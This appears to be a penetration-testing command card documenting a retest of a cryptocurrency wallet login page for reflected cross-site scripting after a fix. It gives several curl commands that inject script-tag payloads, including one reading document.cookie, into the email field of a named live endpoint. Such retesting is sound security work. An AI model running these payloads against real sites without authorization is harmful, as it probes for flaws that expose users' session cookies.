---
id: cmd-retest-xss-script
data: >-
  curl -X POST https://wallet.romit.io/login -d
  "email[]=<script>alert(document.cookie)</script>&password=test&_csrf=example-token"
  -H "Content-Type: application/x-www-form-urlencoded"
tags:
  - xss
  - script
type: command
output: null
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:35.269Z'
verified: false
validated: true
submitted: true
---
# Retest XSS Script Payload

## Command

```bash
curl -X POST https://wallet.romit.io/login \
  -d "email[]=<script>alert(document.cookie)</script>&password=test&_csrf=example-token" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

## Description

Retests the login endpoint with a direct script tag payload after a fix attempt, checking for automatic JavaScript execution on reflection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | POST data with script payload | Yes |
| `email[]` | Script tag injection | Yes |
| `password` | Dummy value | Yes |
| `_csrf` | Token value | Yes |
| `-H` | Content type header | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://wallet.romit.io/login -d "email[]=<script>alert(1)</script>&password=test&_csrf=token" -H "Content-Type: application/x-www-form-urlencoded"
```

### Advanced Usage

```bash
curl -X POST https://wallet.romit.io/login -d "email[]=<script>prompt('XSS')</script>&password=pass&_csrf=token" -H "Content-Type: application/x-www-form-urlencoded" --output response.html
```

## Expected Output

HTML response with reflected <script> tag, which executes alert(document.cookie) when opened in a browser, displaying cookies.

## Related

- [[Related Procedure: Retest XSS with Simpler Payload After Fix]]
